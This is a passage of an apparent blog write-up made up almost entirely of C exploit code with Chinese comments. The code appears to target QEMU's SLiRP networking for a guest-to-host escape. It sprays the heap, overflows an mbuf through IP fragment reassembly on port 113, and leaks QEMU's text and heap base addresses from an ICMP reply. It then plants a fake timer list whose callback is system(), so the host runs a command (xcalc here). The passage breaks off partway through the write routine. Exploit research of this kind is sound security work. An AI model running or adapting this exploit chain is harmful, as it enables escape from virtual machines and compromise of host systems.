class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> text_base, heap_base;</span><br><span class="line"><span class="type">uint16_t</span> g_spray_ip_id;</span><br><span class="line"><span class="type">int</span> stop_flag;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> eth_frame[] =</span><br><span class="line">            <span class="string">&quot;\x52\x56\x00\x00\x00\x02\x52\x54\x00\x12\x34\x56\x08\x00&quot;</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">icmphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> buf[IP_MAXPACKET];</span><br><span class="line">    <span class="type">char</span> src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;game start&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, eth_frame, ETH_HDRLEN);</span><br><span class="line">    iphdr = (<span class="keyword">struct</span> ip *)(buf + ETH_HDRLEN);</span><br><span class="line">    <span class="built_in">strcpy</span>(src_ip, <span class="string">&quot;10.0.2.15&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dst_ip, <span class="string">&quot;10.0.2.2&quot;</span>);</span><br><span class="line">    iphdr-&gt;ip_hl = IP4_HDRLEN / <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>);</span><br><span class="line">    iphdr-&gt;ip_v = <span class="number">4</span>;</span><br><span class="line">    iphdr-&gt;ip_tos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 这不需要htons，因为在ip_input里会转换一遍</span></span><br><span class="line">    iphdr-&gt;ip_len = (ICMP_HDRLEN);</span><br><span class="line">    iphdr-&gt;ip_id = (<span class="number">0xcdcd</span>);</span><br><span class="line">    <span class="comment">// Zero (1 bit)</span></span><br><span class="line">    <span class="comment">// Do not fragment flag (1 bit)</span></span><br><span class="line">    <span class="comment">// More fragments following flag (1 bit)</span></span><br><span class="line">    <span class="comment">// Fragmentation offset (13 bits)</span></span><br><span class="line">    iphdr-&gt;ip_off = ((<span class="number">0</span> &lt;&lt; <span class="number">15</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">14</span>) + (<span class="number">0</span> &lt;&lt; <span class="number">13</span>) + (<span class="number">0</span> &gt;&gt; <span class="number">3</span>));</span><br><span class="line">    iphdr-&gt;ip_ttl = <span class="number">255</span>;</span><br><span class="line">    iphdr-&gt;ip_p = IPPROTO_ICMP;</span><br><span class="line">    <span class="keyword">if</span> ((status = inet_pton(AF_INET, src_ip, &amp;(iphdr-&gt;ip_src))) != <span class="number">1</span> ||</span><br><span class="line">        (status = inet_pton(AF_INET, dst_ip, &amp;(iphdr-&gt;ip_dst))) != <span class="number">1</span>) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;inet_pton() failed.\nError message: %s&quot;</span>, strerror(status));</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    iphdr-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    iphdr-&gt;ip_sum = checksum((<span class="type">uint16_t</span> *)&amp;iphdr, IP4_HDRLEN);</span><br><span class="line"></span><br><span class="line">    icmphdr = (<span class="keyword">struct</span> icmp *)(buf + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    icmphdr-&gt;icmp_type = ICMP_ECHO;</span><br><span class="line">    <span class="comment">// Message Code (8 bits): echo request</span></span><br><span class="line">    icmphdr-&gt;icmp_code = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// Identifier (16 bits): usually pid of sending process - pick a number</span></span><br><span class="line">    icmphdr-&gt;icmp_id = htons(<span class="number">1000</span>);</span><br><span class="line">    <span class="comment">// Sequence Number (16 bits): starts at 0</span></span><br><span class="line">    icmphdr-&gt;icmp_seq = htons(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// ICMP header checksum (16 bits): set to 0 when calculating checksum</span></span><br><span class="line">    <span class="comment">// TBD</span></span><br><span class="line">    <span class="comment">// icmphdr-&gt;icmp_cksum = icmp4_checksum(icmphdr, data, datalen);</span></span><br><span class="line">    icmphdr-&gt;icmp_cksum = icmp4_checksum(*icmphdr, buf, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//const char exec_cmd[] =</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//const char exec_cmd[] = &quot;/snap/bin/gnome-calculator&quot;;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> exec_cmd[] = <span class="string">&quot;/usr/bin/xcalc&quot;</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf + ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN, exec_cmd,<span class="built_in">strlen</span>(exec_cmd) + <span class="number">1</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xaabb</span>;</span><br><span class="line">    arbitrary_write(</span><br><span class="line">            <span class="number">0x0b00</span>, <span class="number">3</span>, buf,</span><br><span class="line">            ETH_HDRLEN + IP4_HDRLEN + ICMP_HDRLEN + <span class="built_in">strlen</span>(exec_cmd) + <span class="number">1</span>, <span class="number">0x250</span>+<span class="number">0x50</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xbbaa</span>;</span><br><span class="line">    leak(<span class="number">0x0b00</span> + <span class="number">0x318</span> + <span class="number">0x14</span> + ETH_HDRLEN,</span><br><span class="line">         <span class="number">3</span>); <span class="comment">// reass处理完后会把m_data减掉ip头的长度</span></span><br><span class="line">    dbg_printf(<span class="string">&quot;after leak&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake timer_list</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> fake_timer_list = heap_base + <span class="number">0x1000</span>;</span><br><span class="line">    <span class="comment">//*(uint64_t *)buf = text_base +  0x11e9040; // qemu_clocks</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)buf = text_base +  <span class="number">0x12C3920</span>; <span class="comment">// qemu_clocks</span></span><br><span class="line">    <span class="built_in">memset</span>(buf + <span class="number">8</span>, <span class="number">0</span>, <span class="number">8</span> * <span class="number">6</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x38</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">//*(uint64_t *)(buf + 0x40) = fake_timer_list + 0x70; // active_timers</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x40</span>) = fake_timer_list + <span class="number">0x70</span>; <span class="comment">// active_timers</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x48</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x50</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x58</span>) = text_base + <span class="number">0x30eeda</span>; <span class="comment">// qemu_timer_notify_cb</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x60</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x68</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">// end of timer_list</span></span><br><span class="line">    <span class="comment">// start of active_timers</span></span><br><span class="line">    <span class="comment">/* gdb-peda$ p *timer_list-&gt;active_timers</span></span><br><span class="line"><span class="comment">    $49 = &#123;</span></span><br><span class="line"><span class="comment">        expire_time = 0x22823f5aad00,</span></span><br><span class="line"><span class="comment">        timer_list = 0x55a8d2594840,</span></span><br><span class="line"><span class="comment">        cb = 0x55a8d0b66a82 &lt;gui_update&gt;,</span></span><br><span class="line"><span class="comment">        opaque = 0x55a8d3ae6e50,</span></span><br><span class="line"><span class="comment">        next = 0x55a8d3ae6e80,</span></span><br><span class="line"><span class="comment">        attributes = 0x0,</span></span><br><span class="line"><span class="comment">        scale = 0xf4240</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x70</span>) = <span class="number">0</span>; <span class="comment">// expire_time set to 0 will trigger func cb</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x78</span>) = fake_timer_list;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x80</span>) = text_base + <span class="number">0x2be010</span>;    <span class="comment">// system plt</span></span><br><span class="line">    <span class="comment">//to verify</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x88</span>) = heap_base + <span class="number">0xe38</span> + <span class="number">0xa</span>; <span class="comment">// parameter address</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x90</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x98</span>) = <span class="number">0x000f424000000000</span>;</span><br><span class="line">    g_spray_ip_id = <span class="number">0xccbb</span>;</span><br><span class="line">    arbitrary_write(fake_timer_list - <span class="number">0x318</span>, <span class="number">8</span>, buf, <span class="number">0xa0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we have finished writing fake timer list.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    stop_flag = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// dbg_printf(&quot;check heap here&quot;);</span></span><br><span class="line">    <span class="comment">// qemu timer</span></span><br><span class="line">    <span class="comment">// 改掉全局的main_loop_tlg</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)buf = fake_timer_list; <span class="comment">// qemu_clocks</span></span><br><span class="line">    g_spray_ip_id = <span class="number">0xddbb</span>;</span><br><span class="line">    arbitrary_write(text_base + <span class="number">0x12C3900</span> - <span class="number">0x318</span>, <span class="number">8</span>, buf, <span class="number">8</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we have finished writing main_loop_tlg.\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> addr_len)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, len, i, recvsd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *payload = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="type">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="type">uint32_t</span> *payload32 = (<span class="type">uint32_t</span> *)payload;</span><br><span class="line">    <span class="type">uint64_t</span> *payload64 = (<span class="type">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">&quot;ama2in9&quot;</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    dbg_printf(<span class="string">&quot;in leak_text...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;spraying size 0x2000, id: %d\n&quot;</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    dbg_printf(<span class="string">&quot;spray finished.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    ret = connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;0ops: client&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let&#x27;s overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">        <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">60000</span>); <span class="comment">// 不知道为啥，貌似内核会合并包？</span></span><br><span class="line">        <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">        <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">&quot;send %d complete\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="type">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="type">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="type">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="type">uint8_t</span> *)payload - payload_start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]leaking: Now we have finished faking m_data.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    dbg_printf(<span class="string">&quot;trigger reass!&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">&quot;ama2in9&quot;</span>, <span class="number">7</span>);</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line"></span><br><span class="line">    recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]leaking: Now we have finished writting to target.\nAlso, this means we will get the response packet we want.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// we receive data here</span></span><br><span class="line">    <span class="type">int</span> bytes, status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">recv_iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">recv_icmphdr</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> recv_ether_frame[IP_MAXPACKET];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">from</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> fromlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">wait</span>, <span class="title">t1</span>, <span class="title">t2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">    <span class="type">double</span> dt;</span><br><span class="line"></span><br><span class="line">    (<span class="type">void</span>)gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">    wait.tv_sec = <span class="number">2</span>;</span><br><span class="line">    wait.tv_usec = <span class="number">0</span>;</span><br><span class="line">    setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (<span class="type">char</span> *)&amp;wait,</span><br><span class="line">               <span class="keyword">sizeof</span>(<span class="keyword">struct</span> timeval));</span><br><span class="line">    recv_iphdr = (<span class="keyword">struct</span> ip *)(recv_ether_frame + ETH_HDRLEN);</span><br><span class="line">    recv_icmphdr = (<span class="keyword">struct</span> icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(recv_ether_frame, <span class="number">0</span>, IP_MAXPACKET * <span class="keyword">sizeof</span>(<span class="type">uint8_t</span>));</span><br><span class="line">        <span class="built_in">memset</span>(&amp;from, <span class="number">0</span>, <span class="keyword">sizeof</span>(from));</span><br><span class="line">        fromlen = <span class="keyword">sizeof</span>(from);</span><br><span class="line">        <span class="keyword">if</span> ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, <span class="number">0</span>,</span><br><span class="line">                              (<span class="keyword">struct</span> sockaddr *)&amp;from, &amp;fromlen)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            status = errno;</span><br><span class="line">            <span class="keyword">if</span> (status == EAGAIN) &#123; <span class="comment">// EAGAIN = 11</span></span><br><span class="line">                dbg_printf(<span class="string">&quot;No reply within %li seconds.\n&quot;</span>, wait.tv_sec);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == EINTR) &#123; <span class="comment">// EINTR = 4</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">&quot;recvfrom() failed &quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">// End of error handling conditionals.</span></span><br><span class="line">        <span class="comment">// hexdump(&quot;recv&quot;, recv_ether_frame, 0x50);</span></span><br><span class="line">        dbg_printf(<span class="string">&quot;recv count %d\n&quot;</span>, count++);</span><br><span class="line">        <span class="keyword">if</span> ((((recv_ether_frame[<span class="number">12</span>] &lt;&lt; <span class="number">8</span>) + recv_ether_frame[<span class="number">13</span>]) ==</span><br><span class="line">             ETH_P_IP) &amp;&amp;</span><br><span class="line">            (recv_iphdr-&gt;ip_p == IPPROTO_ICMP) &amp;&amp;</span><br><span class="line">            (recv_icmphdr-&gt;icmp_type == ICMP_ECHOREPLY)) &#123;</span><br><span class="line">            <span class="comment">// Stop timer and calculate how long it took to get a reply.</span></span><br><span class="line">            (<span class="type">void</span>)gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">            dt = (<span class="type">double</span>)(t2.tv_sec - t1.tv_sec) * <span class="number">1000.0</span> +</span><br><span class="line">                 (<span class="type">double</span>)(t2.tv_usec - t1.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line">            <span class="comment">// 底下这个可能会segfault</span></span><br><span class="line">            <span class="comment">// if (inet_ntop(AF_INET, &amp;(recv_iphdr-&gt;ip_src.s_addr), rec_ip,</span></span><br><span class="line">            <span class="comment">// INET_ADDRSTRLEN) == NULL) &#123;</span></span><br><span class="line">            <span class="comment">//     status = errno;</span></span><br><span class="line">            <span class="comment">//     fprintf(stderr, &quot;inet_ntop() failed.\nError message: %s&quot;,</span></span><br><span class="line">            <span class="comment">//     strerror(status)); exit(EXIT_FAILURE);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            dbg_printf(<span class="string">&quot;%g ms (%i bytes received)\n&quot;</span>, dt, bytes);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">            hexdump(<span class="string">&quot;ping recv&quot;</span>, recv_ether_frame, bytes);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            <span class="keyword">if</span> (bytes &lt; <span class="number">0x200</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            text_base =</span><br><span class="line">                    ((*(<span class="type">uint64_t</span> *)(recv_ether_frame + <span class="number">0x88</span>)) - <span class="number">0x7e7d01</span>) &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">            heap_base = (*(<span class="type">uint64_t</span> *)(recv_ether_frame + <span class="number">0x90</span>)) &amp; ~<span class="number">0xffffff</span>;</span><br><span class="line">            dbg_printf(<span class="string">&quot;leak text_base: 0x%lx\n&quot;</span></span><br><span class="line">                       <span class="string">&quot;leak heap_base: 0x%lx\n&quot;</span>,</span><br><span class="line">                       text_base, heap_base);</span><br><span class="line">            <span class="comment">// getchar();</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="comment">// End if IP ethernet frame carrying ICMP_ECHOREPLY</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    close(s);</span><br><span class="line">    close(recvsd);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">arbitrary_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> addr_len, <span class="type">uint8_t</span> *write_data,</span></span><br><span class="line"><span class="params">                    <span class="type">int</span> write_data_len, <span class="type">int</span> spray_times)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, len, i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *payload = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="type">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="type">uint32_t</span> *payload32 = (<span class="type">uint32_t</span> *)payload;</span><br><span class="line">    <span class="type">uint64_t</span> *payload64 = (<span class="type">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(payload, <span class="string">&quot;xmzyshypnc&quot;</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">&quot;spraying size 0x2000, id: %d\n&quot;</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we spray to malloc all freed buf.\n&quot;</span>);</span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    dbg_printf(<span class="string">&quot;spray finished.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    ret = connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;oops: client&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Now we finished the malloc of so_rcv and the mbuf.\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let&#x27;s overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">        <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">20000</span>); <span class="comment">// 不知道为，貌似内核会合并包？</span></span><br><span class="line">        <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">        <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">&quot;send %d complete\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="type">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="type">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="type">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    